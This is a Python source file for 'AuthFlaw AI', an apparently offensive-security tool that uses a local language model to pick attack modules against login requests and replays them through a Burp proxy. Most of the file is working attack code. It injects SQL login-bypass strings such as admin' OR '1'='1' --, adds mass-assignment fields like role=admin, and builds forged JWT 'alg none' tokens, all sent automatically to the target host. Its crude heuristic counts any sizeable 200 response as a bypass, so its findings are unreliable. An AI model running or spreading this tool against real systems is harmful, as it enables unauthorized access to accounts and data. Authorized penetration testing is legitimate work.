#!/usr/bin/env python3
"""
AuthFlaw AI - Authentication Logic Bypass Tool
Python + MCP + Local AI (Ollama)
Version: 1.0.0
"""

VERSION = "1.0.0"

BANNER = r"""
   _____     ____ ___  ___________   ___ ___           ___________ .____         _____    __      __  
  /  _  \   |    |   \ \__    ___/  /   |   \          \_   _____/ |    |       /  |  |  /  \    /  \ 
 /  /_\  \  |    |   /   |    |    /    ~    \          |    __)   |    |      /   |  |_ \   \/\/   / 
/    |    \ |    |  /    |    |    \    Y    /          |     \    |    |___  /    ^   /  \        /  
\____|__  / |______/     |____|     \___|_  /   ______  \___  /    |_______ \ \____   |    \__/\  /   
        \/                                \/   /_____/      \/             \/      |__|         \/    
                                                                                                      
                                                                      _____    .___                   
  ______   ____   _____      ____     ____     ____   _______        /  _  \   |   |                  
 /  ___/ _/ ___\  \__  \    /    \   /    \  _/ __ \  \_  __ \      /  /_\  \  |   |                  
 \___ \  \  \___   / __ \_ |   |  \ |   |  \ \  ___/   |  | \/     /    |    \ |   |                  
/____  >  \___  > (____  / |___|  / |___|  /  \___  >  |__|        \____|__  / |___|                  
     \/       \/       \/       \/       \/       \/                       \/                         
                                                                                                      
"""

import re
import json
import requests
import ollama
from urllib.parse import urlparse, parse_qs
from colorama import init, Fore, Style
from typing import Dict, List, Optional
import warnings

warnings.filterwarnings('ignore', message='Unverified HTTPS request')
init(autoreset=True)

class AuthFlawAI:
    def __init__(self, burp_host="127.0.0.1", burp_port=8080):
        self.burp_proxy = {
            "http": f"http://{burp_host}:{burp_port}",
            "https": f"http://{burp_host}:{burp_port}"
        }
        self.session = requests.Session()
        self.session.proxies = self.burp_proxy
        self.session.verify = False
        self.findings = []
        
        # Test Ollama connection
        try:
            self.ai = ollama.Client()
            # Quick connectivity test
            test = self.ai.generate(model="llama3.2", prompt="test", options={"num_predict": 1})
            print(f"{Fore.GREEN}[+] AI connected (Ollama llama3.2)\n")
        except Exception as e:
            self.ai = None
            print(f"{Fore.YELLOW}[!] Ollama not available: {str(e)[:60]}")
            print(f"{Fore.YELLOW}[!] Using fallback mode (still works!)\n")
        
    def parse_raw_request(self, raw_request: str) -> Dict:
        """Parse raw HTTP request into structured format"""
        lines = raw_request.strip().split('\n')
        
        # Parse request line
        request_line = lines[0].split(' ')
        method = request_line[0]
        path = request_line[1]
        
        # Parse headers
        headers = {}
        body_start = 0
        for i, line in enumerate(lines[1:], 1):
            if line.strip() == '':
                body_start = i + 1
                break
            if ': ' in line:
                key, value = line.split(': ', 1)
                headers[key] = value
        
        # Parse body
        body = '\n'.join(lines[body_start:]) if body_start < len(lines) else ''
        
        # Parse URL parameters
        url_parse = urlparse(path)
        params = parse_qs(url_parse.query)
        
        # Detect auth mechanism
        auth_type = self._detect_auth(headers, body)
        
        return {
            "method": method,
            "path": url_parse.path,
            "params": params,
            "headers": headers,
            "body": body,
            "auth_type": auth_type,
            "raw": raw_request
        }
    
    def _detect_auth(self, headers: Dict, body: str) -> str:
        """Detect authentication mechanism"""
        # Check for JWT
        auth_header = headers.get('Authorization', '')
        if 'Bearer' in auth_header:
            return "JWT"
        if 'Basic' in auth_header:
            return "Basic"
        
        # Check for session cookies
        cookie = headers.get('Cookie', '')
        if 'session' in cookie.lower() or 'token' in cookie.lower():
            return "Session"
        
        # Check body for credentials
        if '"email"' in body and '"password"' in body:
            return "JSON_Login"
        if 'email=' in body or 'username=' in body or 'user=' in body:
            return "Form_Login"
        if 'password=' in body:
            return "Form_Login"
        
        # Check content type for form data
        content_type = headers.get('Content-Type', '')
        if 'application/x-www-form-urlencoded' in content_type:
            return "Form_Login"
        if 'application/json' in content_type:
            return "JSON_Login"
        
        return "Unknown"
    
    def ai_analyze_request(self, request: Dict) -> Dict:
        """Use local AI to analyze request and suggest attack modules"""
        
        if not self.ai:
            return self._fallback_analysis(request)
        
        prompt = f"""Analyze auth request. JSON only:
Method: {request['method']}
Path: {request['path']}
Type: {request['auth_type']}
Body: {request['body'][:100]}

Response:
{{"auth_mechanism":"Form_Login","potential_vulns":["SQLi"],"modules_to_run":["SQLi"]}}"""
        
        try:
            print(f"{Fore.CYAN}  [AI] Analyzing with Ollama...")
            response = self.ai.generate(
                model="llama3.2", 
                prompt=prompt,
                options={"num_predict": 100, "temperature": 0.1, "num_ctx": 512}
            )
            
            response_text = response['response'].strip()
            if '{' in response_text:
                json_start = response_text.find('{')
                json_end = response_text.rfind('}') + 1
                result = json.loads(response_text[json_start:json_end])
                print(f"{Fore.GREEN}  [AI] Analysis complete")
                return result
        except Exception as e:
            print(f"{Fore.YELLOW}  [AI] Failed: {str(e)[:50]}, using fallback")
        
        return self._fallback_analysis(request)
    
    def _fallback_analysis(self, request: Dict) -> Dict:
        """Fallback if AI is not available"""
        modules = []
        payloads = []
        
        if request['auth_type'] == "JWT":
            modules = ["JWT_None", "JWT_Confusion"]
            payloads = [
                '{"alg":"none"}.eyJyb2xlIjoiYWRtaW4ifQ.',
                'HS256 signed with RS256 public key'
            ]
        elif request['auth_type'] in ["JSON_Login", "Form_Login"]:
            modules = ["SQLi", "MassAssignment", "RegistrationPrivEsc"]
            payloads = [
                '"email":"admin\' OR \'1\'=\'1\' --"',
                '"role":"admin"',
                '"is_admin":true'
            ]
        elif request['auth_type'] == "Form_Login" or 'login' in request['path'].lower():
            # Default to form-based attacks for login endpoints
            modules = ["SQLi", "MassAssignment"]
            payloads = [
                'admin\' OR \'1\'=\'1\' --',
                'admin\' OR 1=1--',
                '\' OR \'1\'=\'1'
            ]
        
        return {
            "auth_mechanism": request['auth_type'],
            "potential_vulns": modules,
            "modules_to_run": modules,
            "payloads": payloads
        }
    
    def generate_attack_variants(self, original: Dict, ai_decision: Dict) -> List[Dict]:
        """Generate mutated requests based on AI decision"""
        variants = []
        
        # Detect if body is JSON or form data
        is_json = original['headers'].get('Content-Type', '').lower().find('application/json') != -1
        is_form = original['headers'].get('Content-Type', '').lower().find('application/x-www-form-urlencoded') != -1
        
        for module in ai_decision.get('modules_to_run', []):
            if module == "SQLi":
                # SQL Injection payloads
                sqli_payloads = [
                    "admin' OR '1'='1' --",
                    "admin' OR '1'='1' #",
                    "admin'--",
                    "' OR 1=1--",
                    "') OR ('1'='1'--"
                ]
                
                for payload in sqli_payloads:
                    variant = original.copy()
                    variant['headers'] = original['headers'].copy()
                    
                    if is_form:
                        # Inject into form data
                        body = variant['body']
                        # Try to inject into username field
                        if 'username=' in body:
                            body = re.sub(r'username=([^&]*)', f'username={payload}', body)
                        elif 'email=' in body:
                            body = re.sub(r'email=([^&]*)', f'email={payload}', body)
                        variant['body'] = body
                    elif is_json:
                        # Inject into JSON
                        if 'email' in variant['body']:
                            variant['body'] = re.sub(
                                r'"email"\s*:\s*"[^"]*"',
                                f'"email":"{payload}"',
                                variant['body']
                            )
                    
                    variants.append({
                        "module": module,
                        "payload": payload,
                        "request": variant
                    })
            
            elif module == "MassAssignment":
                # Mass assignment payloads
                mass_payloads = [
                    ('role', 'admin'),
                    ('is_admin', 'true'),
                    ('admin', '1'),
                    ('user_type', 'admin')
                ]
                
                for param_name, param_value in mass_payloads:
                    variant = original.copy()
                    variant['headers'] = original['headers'].copy()
                    
                    if is_form:
                        # Add to form data
                        variant['body'] = original['body'] + f'&{param_name}={param_value}'
                    elif is_json:
                        # Add to JSON
                        if variant['body'].strip().endswith('}'):
                            variant['body'] = variant['body'].rstrip().rstrip('}') + f',"{param_name}":"{param_value}"' + '}'
                    
                    variants.append({
                        "module": module,
                        "payload": f"{param_name}={param_value}",
                        "request": variant
                    })
        
        return variants
    
    def send_to_burp_repeater(self, variant: Dict) -> Optional[Dict]:
        """Send request through Burp proxy (appears in HTTP History)"""
        try:
            host = variant['request']['headers'].get('Host', 'target.com')
            
            # Determine protocol based on original request or default to http for localhost
            if 'localhost' in host or '127.0.0.1' in host:
                url = f"http://{host}{variant['request']['path']}"
            else:
                url = f"https://{host}{variant['request']['path']}"
            
            # Prepare request data
            request_kwargs = {
                'method': variant['request']['method'],
                'url': url,
                'headers': variant['request']['headers'],
                'timeout': 10
            }
            
            # Add body for POST requests
            if variant['request']['method'] == 'POST':
                request_kwargs['data'] = variant['request']['body']
            
            # Add params for GET requests
            if variant['request'].get('params'):
                request_kwargs['params'] = variant['request']['params']
            
            response = self.session.request(**request_kwargs)
            
            return {
                "status": response.status_code,
                "headers": dict(response.headers),
                "body": response.text[:1000],  # First 1000 chars
                "length": len(response.text)
            }
        except Exception as e:
            print(f"{Fore.RED}    Request failed: {e}")
            return None
    
    def ai_analyze_response(self, request: Dict, response: Dict, original: Dict) -> Dict:
        """AI analyzes response to determine if vulnerability exists"""
        
        # Skip AI analysis for speed - use heuristics
        status = response.get('status')
        body_length = response.get('length', 0)
        
        # Simple heuristic-based detection
        if status == 200 and body_length > 100:
            return {
                "success": "yes", 
                "vulnerability": "Possible authentication bypass", 
                "next_action": "report_finding", 
                "cvss_estimate": 8.0
            }
        elif status == 302:
            location = response.get('headers', {}).get('Location', '')
            if 'login' not in location.lower() and 'error' not in location.lower():
                return {
                    "success": "yes", 
                    "vulnerability": "Redirect to authenticated area", 
                    "next_action": "report_finding", 
                    "cvss_estimate": 8.5
                }
        
        return {
            "success": "no", 
            "vulnerability": None, 
            "next_action": "stop", 
            "cvss_estimate": 0.0
        }
    
    def run(self, raw_request: str):
        """Main execution flow"""
        print(f"{Fore.CYAN}{BANNER}")
        print(f"{Fore.GREEN}Authentication Bypass Testing Tool v{VERSION}")
        print(f"{Fore.CYAN}{'='*120}\n")
        
        # PHASE 1: Parse request
        print(f"{Fore.YELLOW}[1/5] Parsing request...")
        parsed = self.parse_raw_request(raw_request)
        print(f"  → Method: {parsed['method']}")
        print(f"  → Path: {parsed['path']}")
        print(f"  → Auth Type: {parsed['auth_type']}")
        
        # PHASE 2: AI Analysis
        print(f"\n{Fore.YELLOW}[2/5] AI analyzing request...")
        ai_decision = self.ai_analyze_request(parsed)
        print(f"  → Auth mechanism: {ai_decision.get('auth_mechanism')}")
        print(f"  → Potential vulns: {', '.join(ai_decision.get('potential_vulns', []))}")
        print(f"  → Modules to run: {', '.join(ai_decision.get('modules_to_run', []))}")
        
        # PHASE 3: Generate variants
        print(f"\n{Fore.YELLOW}[3/5] Generating attack variants...")
        variants = self.generate_attack_variants(parsed, ai_decision)
        print(f"  → Generated {len(variants)} attack variants")
        
        # PHASE 4: Send and analyze
        print(f"\n{Fore.YELLOW}[4/5] Testing via Burp proxy...")
        for i, variant in enumerate(variants, 1):
            print(f"\n  [{i}/{len(variants)}] Testing: {variant['module']}")
            print(f"    Payload: {variant['payload'][:80]}...")
            print(f"    Modified Body: {variant['request']['body'][:100]}...")
            
            response = self.send_to_burp_repeater(variant)
            if response:
                print(f"    Response: HTTP {response['status']}")
                
                analysis = self.ai_analyze_response(variant, response, parsed)
                
                if analysis.get('success') == 'yes':
                    print(f"    {Fore.RED}[!] VULNERABLE! {analysis.get('vulnerability')}")
                    self.findings.append({
                        "module": variant['module'],
                        "payload": variant['payload'],
                        "response_status": response['status'],
                        "vulnerability": analysis.get('vulnerability'),
                        "cvss": analysis.get('cvss_estimate')
                    })
                elif analysis.get('success') == 'partial':
                    print(f"    {Fore.YELLOW}[*] PARTIAL - Need adjustment")
                else:
                    print(f"    {Fore.GREEN}[+] Not vulnerable")
        
        # PHASE 5: Report
        print(f"\n{Fore.YELLOW}[5/5] Generating report...")
        self.generate_report()
    
    def generate_report(self):
        """Print final report"""
        print(f"\n{Fore.CYAN}{'='*120}")
        print(f"{Fore.GREEN}FINDINGS REPORT")
        print(f"{Fore.CYAN}{'='*120}\n")
        
        if not self.findings:
            print(f"{Fore.GREEN}[+] No vulnerabilities found with tested payloads.")
            print(f"{Fore.YELLOW}[*] Review manually or run advanced modules.")
        else:
            print(f"{Fore.RED}[!] Found {len(self.findings)} potential vulnerabilities:\n")
            for i, finding in enumerate(self.findings, 1):
                print(f"  {i}. {finding['module']}")
                print(f"     CVSS: {finding['cvss']}")
                print(f"     Status: HTTP {finding['response_status']}")
                print(f"     Payload: {finding['payload'][:80]}...")
                print(f"     Vulnerability: {finding['vulnerability']}\n")
        
        print(f"{Fore.CYAN}[*] All requests sent through Burp proxy - Check HTTP History")
        print(f"{Fore.CYAN}[*] Use Repeater to manually investigate findings\n")
        
        # Save to JSON
        with open('reports/findings.json', 'w') as f:
            json.dump(self.findings, f, indent=2)
        print(f"{Fore.GREEN}[+] Report saved to reports/findings.json")

def main():
    import sys
    import signal
    
    # Handle Ctrl+C gracefully
    def signal_handler(sig, frame):
        print(f"\n\n{Fore.YELLOW}[*] Scan interrupted by user")
        print(f"{Fore.CYAN}[*] Partial results may be available in reports/findings.json")
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    # Check if file input is provided
    if len(sys.argv) > 1:
        # Read from file
        try:
            with open(sys.argv[1], 'r', encoding='utf-8') as f:
                raw_request = f.read()
            print(f"{Fore.GREEN}[+] Loaded request from file: {sys.argv[1]}\n")
        except FileNotFoundError:
            print(f"{Fore.RED}[!] File not found: {sys.argv[1]}")
            return
        except Exception as e:
            print(f"{Fore.RED}[!] Error reading file: {e}")
            return
    else:
        # Interactive input
        print(f"{Fore.CYAN}Paste your HTTP request (press Enter twice when done):")
        print(f"{Fore.YELLOW}TIP: For requests with special characters, save to a file and run: python authflaw.py request.txt\n")
        lines = []
        empty_count = 0
        while True:
            try:
                line = input()
                if not line:
                    empty_count += 1
                    if empty_count >= 2:  # Two consecutive empty lines
                        break
                else:
                    empty_count = 0
                lines.append(line)
            except EOFError:
                break
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[*] Input cancelled")
                return
        
        raw_request = '\n'.join(lines)
    
    if not raw_request or not raw_request.strip():
        print(f"{Fore.RED}[!] No request provided!")
        return
    
    try:
        tool = AuthFlawAI()
        tool.run(raw_request)
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[*] Scan interrupted by user")
        print(f"{Fore.CYAN}[*] Check Burp HTTP History for requests sent so far")
        sys.exit(0)

if __name__ == "__main__":
    main()
